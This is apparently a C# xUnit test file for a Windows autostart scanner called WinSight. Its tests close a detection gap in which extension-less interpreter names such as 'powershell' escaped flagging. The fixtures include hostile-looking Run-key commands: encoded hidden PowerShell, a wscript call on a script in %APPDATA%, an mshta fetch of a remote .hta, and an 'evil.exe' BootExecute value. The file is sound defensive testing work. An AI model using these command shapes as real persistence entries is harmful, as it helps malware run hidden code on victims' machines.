using WinSight.Core;
using WinSight.Persistence;
using Xunit;

namespace WinSight.Persistence.Tests;

/// <summary>
/// The extension-less interpreter bypass, closed from all three sides it could be taken.
/// </summary>
/// <remarks>
/// <b>The defect these exist for.</b> <c>CreateProcess</c> appends <c>.exe</c> to a token with no
/// extension, so a Run value of <c>powershell -enc &lt;base64&gt;</c> runs precisely what
/// <c>powershell.exe -enc &lt;base64&gt;</c> runs. WinSight did not: path resolution never probed
/// <c>System32\&lt;name&gt;.exe</c> nor <c>%PATH%</c>, so the image resolved to nothing; the
/// command-line triage matched a table keyed by <c>powershell.exe</c> against the raw token
/// <c>powershell</c> and found nothing; and the resulting <c>Unresolved</c> status was not part of
/// <see cref="AutostartEntry.IsSuspicious"/> even though its own documentation said it was. The
/// entry left the scanner as <c>Info</c>, which removed it from <c>--flagged</c>, from the MCP
/// tools, from the Guardian tray alert and from VirusTotal enrichment.
///
/// <b>Why each side is tested separately.</b> Any one of the three fixes hides the other two: with
/// resolution repaired the triage never sees a bare token, and with the triage repaired the status
/// never matters. Testing them independently is what keeps a later change from silently reopening
/// the hole through a path the others no longer cover.
/// </remarks>
public sealed class ExtensionlessInterpreterTests
{
    /// <summary>
    /// The whole finding, end to end: the shape an attacker would actually write must be flagged.
    /// </summary>
    [Theory]
    [InlineData("powershell -enc SQBFAFgAIAAoAA==")]
    [InlineData("cmd /c powershell -w hidden -enc SQBFAFgA")]
    [InlineData(@"wscript %APPDATA%\update.vbs")]
    [InlineData("mshta https://example.invalid/a.hta")]
    public void AnExtensionlessInterpreterCommandIsStillTriaged(string command)
    {
        var entry = Unresolved(command);

        Assert.NotEqual(InterpreterAbuse.None, entry.Abuse);
        Assert.True(entry.IsSuspicious);
    }

    /// <summary>
    /// The narrow half of the fix: only a name with no extension at all gains one, so a module
    /// that is not an executable is never renamed into one.
    /// </summary>
    [Theory]
    [InlineData("powershell", "powershell.exe")]
    [InlineData("cmd", "cmd.exe")]
    [InlineData("powershell.exe", "powershell.exe")]
    [InlineData("msv1_0.dll", "msv1_0.dll")]
    [InlineData("winsetupmon.sys", "winsetupmon.sys")]
    [InlineData("", "")]
    public void OnlyAnExtensionlessNameGainsOne(string name, string expected) =>
        Assert.Equal(expected, InterpreterAbuseTriage.NormalizeExtension(name));

    [Fact]
    public void ANameNullStaysNull() => Assert.Null(InterpreterAbuseTriage.NormalizeExtension(null));

    /// <summary>
    /// An autostart entry naming something WinSight cannot locate has no file verdict speaking for
    /// it, which is exactly the condition <see cref="AutostartEntry.IsSuspicious"/> documented and
    /// did not implement.
    /// </summary>
    [Fact]
    public void AnUnresolvableImageIsSuspiciousOnItsOwn()
    {
        var entry = Unresolved("U");

        Assert.Equal(InterpreterAbuse.None, entry.Abuse);
        Assert.Equal(PersistenceStatus.VerificationError, entry.Status);
        Assert.True(entry.IsSuspicious);
    }

    /// <summary>
    /// A probe that failed on I/O is a coverage gap, not a finding, and the two must not collapse
    /// into one another merely because they share a coarse status.
    /// </summary>
    [Fact]
    public void AProbeThatCouldNotRunIsNotAFinding()
    {
        var entry = new AutostartEntry(
            AutostartVector.RunKey,
            "x",
            @"HKCU\...\Run",
            @"C:\Program Files\Vendor\agent.exe",
            ImagePath: null,
            ExpectedImagePath: @"C:\Program Files\Vendor\agent.exe",
            ImageResolutionStatus.Error,
            SignatureVerdict.Unknown);

        Assert.Equal(PersistenceStatus.VerificationError, entry.Status);
        Assert.False(entry.IsSuspicious);
    }

    /// <summary>
    /// Resolution follows what the loader does, so the interpreters that live in System32 (and, for
    /// PowerShell, only on %PATH%) stop reading as "no image".
    /// </summary>
    [Theory]
    [InlineData("cmd")]
    [InlineData("powershell")]
    [InlineData("wscript")]
    [InlineData("regsvr32")]
    public void ABareInterpreterNameResolvesToItsRealBinary(string name)
    {
        var resolved = CommandLine.ResolveExecutable(name + " /c whatever");

        Assert.Equal(ImageResolutionStatus.Present, resolved.Status);
        Assert.NotNull(resolved.ImagePath);
        Assert.Equal(name + ".exe", Path.GetFileName(resolved.ImagePath!), ignoreCase: true);
    }

    /// <summary>
    /// The candidate list is additive: the four locations that resolved module names before this
    /// change still come first, in the same order, so no name resolves to a different file.
    /// </summary>
    [Fact]
    public void TheOriginalCandidateOrderIsPreserved()
    {
        var system32 = Environment.GetFolderPath(Environment.SpecialFolder.System);
        var windir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);

        var candidates = CommandLine.BareModuleCandidates("msv1_0").ToList();

        Assert.Equal(
            [
                Path.Combine(system32, "msv1_0"),
                Path.Combine(system32, "msv1_0.dll"),
                Path.Combine(windir, "msv1_0"),
                Path.Combine(windir, "msv1_0.exe"),
                Path.Combine(system32, "msv1_0.exe"),
            ],
            candidates.Take(5));
    }

    /// <summary>
    /// Windows' own default BootExecute value must resolve, or the highest-value early-boot surface
    /// carries a permanent false positive on every machine.
    /// </summary>
    [Theory]
    [InlineData("autocheck autochk *", "autochk *")]
    [InlineData("AUTOCHECK autochk /q", "autochk /q")]
    [InlineData(@"\??\C:\evil.exe", @"\??\C:\evil.exe")]
    [InlineData("autochk *", "autochk *")]
    public void TheSessionManagerVerbIsNotMistakenForTheImage(string value, string expected) =>
        Assert.Equal(expected, BootExecuteEnumerator.StripSessionManagerVerb(value));

    private static AutostartEntry Unresolved(string command) => new(
        AutostartVector.RunKey,
        "x",
        @"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
        command,
        ImagePath: null,
        ExpectedImagePath: null,
        ImageResolutionStatus.Unresolved,
        SignatureVerdict.Unknown);
}
